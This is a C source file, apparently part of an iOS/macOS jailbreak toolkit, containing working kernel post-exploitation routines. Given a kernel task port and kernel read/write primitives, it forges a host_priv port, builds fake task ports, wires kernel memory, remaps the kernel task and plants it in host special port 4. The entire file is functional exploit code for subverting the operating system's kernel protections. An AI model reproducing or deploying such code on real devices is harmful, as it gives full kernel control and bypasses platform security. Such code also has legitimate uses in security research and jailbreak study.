#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <asl.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CommonCrypto/CommonDigest.h>
#include <sys/stat.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <spawn.h>

#include "kutils.h"
#include "common.h"
#include "physpuppet/utils.h"
#include "physpuppet/libprejailbreak.h"

extern mach_port_t tfp0;

extern uint64_t zone_map_ref_addr;

uint64_t ipc_space_kernel() {
    return kread64(task_get_ipc_port(pinfo(task), mach_task_self()) + koffsetof(ipc_port, receiver));
}

bool patch_host_priv(mach_port_t host) {
    
#define IO_ACTIVE 0x80000000
#define IKOT_HOST_PRIV 4
    
    // locate port in kernel
    uint64_t host_kaddr = task_get_ipc_port(pinfo(task), host);
    
    // change port host type
    uint32_t old = kread32(host_kaddr + 0x0);
    
    kwrite32(host_kaddr + 0x0, IO_ACTIVE | IKOT_HOST_PRIV);
    
    uint32_t new = kread32(host_kaddr);
    
    return ((IO_ACTIVE | IKOT_HOST_PRIV) == new) ? true : false;
}

mach_port_t fake_host_priv_port = MACH_PORT_NULL;
// build a fake host priv port
mach_port_t fake_host_priv() {
    if (fake_host_priv_port != MACH_PORT_NULL) {
        return fake_host_priv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = task_get_ipc_port(pinfo(task), mach_host_self());
    uint64_t realhost = kread64(hostport_addr + koffsetof(ipc_port, kobject));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        return MACH_PORT_NULL;
    }
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // make sure port type has IKOT_HOST_PRIV
    patch_host_priv(port);
    
    // locate the port
    uint64_t port_addr = task_get_ipc_port(pinfo(task), port);

    // change the space of the port
    kwrite64(port_addr + koffsetof(ipc_port, receiver), ipc_space_kernel());
    
    // set the kobject
    kwrite64(port_addr + koffsetof(ipc_port, kobject), realhost);
    
    fake_host_priv_port = port;
    
    return port;
}

void convert_port_to_taskport(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = task_get_ipc_port(pinfo(task), port);
    
    kwrite32(port_kaddr + koffsetof(ipc_port, io_bits), 0x80000000 | 2);
    kwrite32(port_kaddr + koffsetof(ipc_port, references), 0xf00d);
    kwrite32(port_kaddr + koffsetof(ipc_port, srights), 0xf00d);
    kwrite64(port_kaddr + koffsetof(ipc_port, receiver), space);
    kwrite64(port_kaddr + koffsetof(ipc_port, kobject),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_get_ipc_port(pinfo(task), mach_task_self());
    uint64_t task_addr = kread64(task_port_addr + koffsetof(ipc_port, kobject));
    uint64_t itk_space = kread64(task_addr + koffsetof(task, itk_space));
    uint64_t is_table = kread64(itk_space + koffsetof(ipc_space, table));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = kread32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    kwrite32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_taskport(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_taskport(port, ipc_space_kernel(), task_kaddr);
}

uint64_t kalloc_wired(uint64_t size) {
    if (tfp0 == MACH_PORT_NULL) return 0;
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    err = mach_vm_allocate(tfp0, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) return 0;
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) return 0;
    return addr;
}


uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kalloc_wired(0x1000);

    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffsetof(task, ref_count)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffsetof(task, active)) = 1;
    *(uint64_t*)(fake_task + koffsetof(task, vm_map)) = vm_map;
    *(uint8_t*)(fake_task + koffsetof(task, lck_mtx_type)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);

    return fake_task_kaddr;
}

int patch_hsp4() {
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    mach_port_t *port = &mapped_tfp0;
    mach_port_t host_priv = fake_host_priv();

    int ret;
    uint64_t remapped_task_addr = 0;
    uint64_t sizeof_task = 0x1000;

    uint64_t kernel_task_kaddr = kinfo(task);

    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);

    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }

    if (ret != KERN_SUCCESS) {
        return 1;
    }

    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = zone_map_ref_addr;
    uint64_t zone_map = kread64(zone_map_kptr);

    uint64_t kernel_map = kinfo(vm_map);

    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);

    make_port_fake_taskport(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_taskport(km_fake_task_port, km_fake_task_kptr);

    km_fake_task_port = zm_fake_task_port;

    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);


    if (ret != KERN_SUCCESS) {
        return 1;
    }

    if (kernel_task_kaddr == remapped_task_addr) {
        return 1;
    }

    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);

    if (ret != KERN_SUCCESS) {
        return 1;
    }

    uint64_t port_kaddr = task_get_ipc_port(pinfo(task), *port);

    make_port_fake_taskport(*port, remapped_task_addr);

    if (kread64(port_kaddr + koffsetof(ipc_port, kobject)) != remapped_task_addr) {
        return 1;
    }

    const int off_host_special = 0x10;
    uint64_t host_priv_kaddr = task_get_ipc_port(pinfo(task), mach_host_self());
    uint64_t realhost_kaddr = kread64(host_priv_kaddr + koffsetof(ipc_port, kobject));
    kwrite64(realhost_kaddr + off_host_special + 4 * sizeof(void*), port_kaddr);

    return 0;
  }